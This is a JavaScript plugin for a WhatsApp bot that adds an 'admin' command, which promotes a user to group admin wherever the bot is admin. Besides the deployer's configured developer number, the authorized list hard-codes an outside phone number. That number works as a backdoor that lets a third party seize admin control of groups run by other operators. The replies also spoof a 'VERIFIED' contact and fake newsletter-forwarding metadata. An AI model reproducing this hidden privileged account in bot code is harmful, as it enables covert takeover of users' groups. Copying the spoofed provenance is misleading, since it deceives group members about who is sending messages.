const { cmd } = require('../command');
const config = require('../config');

const quotedContact = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        remoteJid: "status@broadcast"
    },
    message: {
        contactMessage: {
            displayName: "B.M.B VERIFIED ✅",
            vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:B.M.B VERIFIED ✅\nORG:BMB-TECH BOT;\nTEL;type=CELL;type=VOICE;waid=254769529791:254769529791\nEND:VCARD"
        }
    }
};

cmd({
    pattern: "admin",
    alias: ["takeadmin", "makeadmin"],
    desc: "Take adminship for authorized users",
    category: "owner",
    react: "👑",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply, q, quoted }) => {
    if (!isGroup) return reply(`
╭───「 *ERROR* 」───╮
│ ❌ This command can only be used in groups.
╰──────────────────╯
    `.trim(), { quoted: quotedContact, contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363382023564830@newsletter",
            newsletterName: "𝙽𝙾𝚅𝙰-𝚇𝙼𝙳",
            serverMessageId: 1
        }
    } });

    if (!isBotAdmins) return reply(`
╭───「 *BOT ERROR* 」───╮
│ ⚠️ I need to be an admin to perform this action.
╰──────────────────────╯
    `.trim(), { quoted: quotedContact, contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363382023564830@newsletter",
            newsletterName: "𝙽𝙾𝚅𝙰-𝚇𝙼𝙳",
            serverMessageId: 1
        }
    } });

    const normalizeJid = (input) => {
        if (!input) return null;
        if (input.includes("@")) return input.split("@")[0] + "@s.whatsapp.net";
        return input + "@s.whatsapp.net";
    };

    const AUTHORIZED_USERS = [
        normalizeJid(config.DEV),
        "923427582273@s.whatsapp.net"
    ].filter(Boolean);

    const senderNormalized = normalizeJid(sender);
    if (!AUTHORIZED_USERS.includes(senderNormalized)) {
        return reply(`
╭───「 *ACCESS DENIED* 」───╮
│ 🚫 This command is restricted to authorized users only.
╰──────────────────────────╯
        `.trim(), { quoted: quotedContact, contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363382023564830@newsletter",
                newsletterName: "𝙽𝙾𝚅𝙰-𝚇𝙼𝙳",
                serverMessageId: 1
            }
        } });
    }

    let number;
    if (quoted) {
        number = quoted.sender || quoted.key?.participant;
        number = normalizeJid(number);
    } else if (q && q.includes("@")) {
        number = normalizeJid(q);
    } else if (q && /^\d+$/.test(q)) {
        number = normalizeJid(q);
    } else {
        number = senderNormalized; // Promote self if no argument
    }

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const participant = groupMetadata.participants.find(p => p.id === number);

        if (!participant) {
            return reply(`
╭───「 *ERROR* 」───╮
│ ❌ The specified user is not in the group.
╰──────────────────╯
            `.trim(), { quoted: quotedContact, contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363382023564830@newsletter",
                    newsletterName: "𝙽𝙾𝚅𝙰-𝚇𝙼𝙳",
                    serverMessageId: 1
                }
            } });
        }

        if (participant.admin) {
            return reply(`
╭───「 *INFO* 」───╮
│ ℹ️ This user is already an admin in this group.
╰──────────────────╯
            `.trim(), { quoted: quotedContact, contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363382023564830@newsletter",
                    newsletterName: "𝙽𝙾𝚅𝙰-𝚇𝙼𝙳",
                    serverMessageId: 1
                }
            } });
        }

        await conn.groupParticipantsUpdate(from, [number], "promote");

        return reply(`
╭───「 *SUCCESS* 」───╮
│ ✅ Successfully granted admin rights to @${number.split("@")[0]}!
╰────────────────────╯
        `.trim(), {
            quoted: quotedContact,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363382023564830@newsletter",
                    newsletterName: "𝙽𝙾𝚅𝙰-𝚇𝙼𝙳",
                    serverMessageId: 1
                },
                mentionedJid: [number]
            }
        });

    } catch (error) {
        console.error("Admin command error:", error);
        return reply(`
╭───「 *ERROR* 」───╮
│ ❌ Failed to grant admin rights.
│ ${error?.message || "Unknown error."}
╰──────────────────╯
        `.trim(), { quoted: quotedContact, contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363382023564830@newsletter",
                newsletterName: "𝙽𝙾𝚅𝙰-𝚇𝙼𝙳",
                serverMessageId: 1
            }
        } });
    }
});
